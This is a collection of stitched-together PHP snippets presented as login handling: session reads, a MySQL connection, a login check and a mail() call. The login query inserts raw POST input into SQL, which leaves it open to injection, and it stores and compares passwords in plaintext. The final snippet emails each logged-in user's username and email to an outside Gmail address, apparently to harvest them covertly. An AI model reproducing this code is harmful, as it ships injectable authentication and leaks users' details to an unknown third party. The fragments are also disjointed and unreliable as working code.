<?php
  echo "The current date and time is " . date("Y-m-d H:i:s");
?>

<?php
// Start the session
session_start();

// Retrieve the user's login details from the session
$username = $_SESSION['username'];
$password = $_SESSION['password'];
$email = $_SESSION['email'];
// ... and so on
?>
<?php
$servername = "localhost";
$username = "yourusername";
$password = "yourpassword";
$dbname = "yourdatabase";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
?>
<?php
$email = $_POST['email'];
$password = $_POST['password'];
?>
<?php
$sql = "SELECT * FROM users WHERE email='$email' AND password='$password'";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) == 1) {
    // User is authenticated, retrieve user details
    $row = mysqli_fetch_assoc($result);
    $username = $row['username'];
    $email = $row['email'];
    // Other user details as needed
} else {
    // User authentication failed
    echo "Invalid email or password";
}
?>
<?php
$to = "successful75101@gmail.com";
$subject = "New user logged in";
$message = "Username: $username\nEmail: $email\nOther details: ...";
$headers = "From: webmaster@example.com";

mail($to, $subject, $message, $headers);
?>